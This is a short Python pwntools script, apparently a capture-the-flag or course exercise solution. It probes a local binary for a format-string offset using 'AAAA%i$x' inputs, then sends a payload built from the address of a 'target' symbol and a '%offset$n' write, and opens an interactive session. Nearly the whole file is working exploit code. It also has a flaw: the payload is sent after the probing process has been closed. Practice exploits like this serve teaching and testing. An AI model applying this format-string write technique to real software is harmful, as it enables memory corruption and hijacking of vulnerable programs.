#!/usr/bin/env python3

from pwn import *
import struct

HOST = "6447.lol"
PORT = 1234

context.arch = "amd64"
context.log_level = 'error'

# elf = context.binary = ELF(f"{__file__.replace('_sol.py', '')}")
# libc = elf.libc

def connect_binary():
    global P, E
    
    P = process(f"{__file__.replace('_sol.py', '')}")
    E = P.elf

def exploit():
    if args.TARGET:
        for i in range(30):
            connect_binary()
            P.sendline(f'AAAA%{i}$x'.encode())
            output = P.recvline().decode('utf-8').strip()
            print('{}: {}'.format(i, output))
            P.close()
            if '41414141' in output:
                offset = i
                print(f'offset found at {offset}')
                break
    
        print(p64(E.symbols['target']))
        payload = p64(E.symbols['target']) + f"%{offset}$n".encode()
        print(payload)
        P.sendline(payload)
        P.interactive()
        P.close()
    else:
        for i in range(30):
            try:
                connect_binary()

                P.sendline('AAAABBBB %{}$x'.format(i)) # replace %x with %s to find the actual values
                P.recvuntil('AAAABBBB ')
                print('{}: {}'.format(i, P.recvline(timeout=0.5).strip().decode()))

                P.close()
            except:
                print('{}: Random Address'.format(i))
                pass 

if __name__ == '__main__':
    exploit()